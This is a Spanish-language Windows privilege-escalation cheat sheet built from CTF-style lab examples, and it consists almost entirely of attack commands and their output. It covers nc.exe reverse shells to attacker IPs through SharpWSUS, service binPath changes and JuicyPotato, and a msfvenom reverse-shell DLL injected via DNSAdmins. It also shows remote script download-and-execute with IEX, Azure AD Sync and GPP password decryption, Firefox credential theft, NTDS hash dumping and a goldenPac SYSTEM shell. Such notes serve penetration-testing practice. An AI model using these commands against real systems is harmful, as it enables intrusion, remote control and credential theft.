# Privesc

## Abuso del grupo WSUS Administrator

### Archivos necesarios
```null
iwr -uri http://10.10.14.2/SharpWSUS.exe -o SharpWSUS.exe
iwr -uri http://10.10.14.2/PsExec64.exe -o PsExec64.exe
iwr -uri http://10.10.14.2/nc.exe -o nc.exe
```

### Reverse Shell
```null
.\SharpWSUS.exe create /payload:"C:\Windows\Temp\Privesc\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c C:\\Windows\Temp\Privesc\\nc.exe -e cmd 10.10.14.2 443" /title:"ReverseShell"
```

## Abuso del grupo Azure Admins

```null
*Evil-WinRM* PS C:\Temp> iwr -uri http://10.10.16.9/AdDecrypt.exe -o AdDecrypt.exe
*Evil-WinRM* PS C:\Temp> iwr -uri http://10.10.16.9/mcrypt.dll -o mcrypt.dll
*Evil-WinRM* PS C:\> cd "C:\Program Files\Microsoft Azure AD Sync\bin"
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\bin> C:\Temp\AdDecrypt.exe -FullSQL

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
```

## Abuso del grupo DNSAdmins

### Creación de binario para la reverse shell

```null
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.9 LPORT=443 -f dll -o pwned.dll
```

### Inserción en un servicio

```null
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd /config /serverlevelplugindll \\10.10.16.9\shared\pwned.dll
```

### Reiniciar servicio

```null
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns
```

## Abuso del grupo Server Operators

### Modificación del BinPath de un servicio

```null
*Evil-WinRM* PS C:\Privesc> sc.exe config VMTools binPath="C:\Privesc\nc.exe -e cmd.exe 10.10.16.6 443"
[SC] ChangeServiceConfig SUCCESS
```

### Reinicio del proceso

```null
*Evil-WinRM* PS C:\Privesc> sc.exe config browser binPath="C:\Windows\System32\cmd.exe /c net localgroup administrators jorden /add"
[SC] ChangeServiceConfig SUCCESS

*Evil-WinRM* PS C:\Privesc> sc.exe start browser
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

## Credenciales cacheadas

### Firefox

```null
*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> dir -Force


    Directory: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release
[...snip...]
```

### Uso de firepwd.py

Primero copiar al directorio actual de trabajo el ``key4.db`` y el ``login.json``

```null
python3 firepwd.py
```

## Listar reglas de Firewall

```null
netsh advfirewall show currentprofile
```

## Abuso del privilegio SeImpersonatePrivileage

## Uso de JuicyPotato

```null
PS C:\Temp> .\JuicyPotato.exe -t * -p C:\Windows\system32\cmd.exe -l 1337 -a "/c C:\Temp\nc.exe -e cmd 10.10.16.2 443"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

## Uso de Named Pipes

Para ello es necesario aprovecharse de una tarea CRON en la que otro usuario se atachée a un named pipe alojado del atacante, de forma que se pueda impersonar para ejecutar comandos como este

### Path

La estructura de llamada es así

```null
\\.\pipe\dummypipe
```

### Explotación

En caso de ser vulnerable, el script en PowerShell de ``decoder_it``, debe devolver el nombre de usuario que se ha conectado

```null
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> .\pipeserverimpersonate.ps1
Waiting for connection on namedpipe:dummypipe
ImpersonateNamedPipeClient: 1
user=HACKBACK\hacker
OpenThreadToken:True
True
CreateProcessWithToken: False  1058
```

#### Alteración del script

```null
###we are impersonating the user, everything we do before RevertoSelf is done on behalf that user
echo "user=$user "
copy C:\Windows\System32\spool\drivers\color\rubbx.bat C:\util\scripts\spool\rubbx.bat
```

## Abuso del servicio userlogger

### Detener el servicio

```null
sc stop userlogger C:\test.txt
```

### Explotación

Pasarle como argumento un fichero con dos puntos al final. Se le asignarán privilegios de lectura y escritura para cualquier usuario

```null
C:\>sc start userlogger C:\test.txt:
```

```null
C:\>icacls test.txt
icacls test.txt
test.txt Everyone:(F)

Successfully processed 1 files; Failed processing 0 files
```

### Iniciar servicio

```null
sc start userlogger C:\Users\Administrator\Desktop\root.txt:
```

## Obtener contenido ADS

```null
more < C:\Users\Administrator\Desktop\root.txt:flag.txt
```

## Dumpeo de hashes NT

```null
impacket-secretsdump -system 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit LOCAL
```


## Obtener procesos por Identificador

```null
PS C:\Windows\Temp> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10/Get-WinEventData.ps1')
```

```null
PS C:\Windows\Temp> Get-WinEvent -FilterHashtable @{Logname='security';id=4688} -MaxEvents 10 | Get-WinEventData
```

## Decrypt groups.xml

```null
gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
MyUnclesAreMarioAndLuigi!!1!
```

## Golden Ticket Attack

```null
goldenPac.py 'htb.local/james:J@m3s_P@ssW0rd!@mantis'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller mantis.htb.local
[*] mantis.htb.local found vulnerable!
[*] Requesting shares on mantis.....
[*] Found writable share ADMIN$
[*] Uploading file xvCbwVPb.exe
[*] Opening SVCManager on mantis.....
[*] Creating service Jlxr on mantis.....
[*] Starting service Jlxr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

